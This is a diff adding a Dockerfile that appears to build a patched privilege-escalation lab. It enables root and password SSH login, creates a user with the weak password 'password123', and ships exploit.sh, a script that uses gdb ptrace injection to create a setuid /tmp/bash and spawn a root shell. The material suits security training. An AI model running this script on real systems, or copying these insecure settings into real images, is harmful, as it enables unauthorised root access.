@@ -1,0 +1,53 @@
+FROM debian:bookworm-slim
+
+RUN apt-get update && apt-get install -y \
+    openssh-server \
+    gdb \
+    sudo \
+    procps \
+    ncurses-bin \
+    && rm -rf /var/lib/apt/lists/*
+
+RUN mkdir -p /run/sshd
+
+RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
+    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+
+RUN useradd -m -s /bin/bash lowpriv && \
+    echo 'lowpriv:password123' | chpasswd
+
+# FIXED: Do NOT grant lowpriv any sudo privileges
+# No /etc/sudoers.d/lowpriv file is created
+
+# Set ptrace_scope to 1 (restricted) where possible
+RUN echo '#!/bin/bash' > /start.sh && \
+    echo 'echo 1 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || true' >> /start.sh && \
+    echo 'exec /usr/sbin/sshd -D' >> /start.sh && \
+    chmod +x /start.sh
+
+COPY --chmod=755 <<'EOF' /home/lowpriv/exploit.sh
+#!/usr/bin/env bash
+echo "[*] Starting ptrace_scope privilege escalation..."
+TARGET_PID=$(pgrep -u "$(id -u)" bash | head -1)
+if [ -z "$TARGET_PID" ]; then
+    echo "[-] No target shell PID found"
+    exit 1
+fi
+echo "[*] Attaching to PID $TARGET_PID..."
+echo 'call (int)system("sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash")' | gdb -q -n -p "$TARGET_PID" >/dev/null 2>&1
+if [ -f /tmp/bash ] && [ -u /tmp/bash ]; then
+    echo "[*] SUID bash created at /tmp/bash"
+    /tmp/bash -p
+else
+    echo "[-] Exploit failed"
+    exit 1
+fi
+EOF
+
+RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh
+
+RUN which gdb
+
+EXPOSE 22
+
+CMD ["/start.sh"]
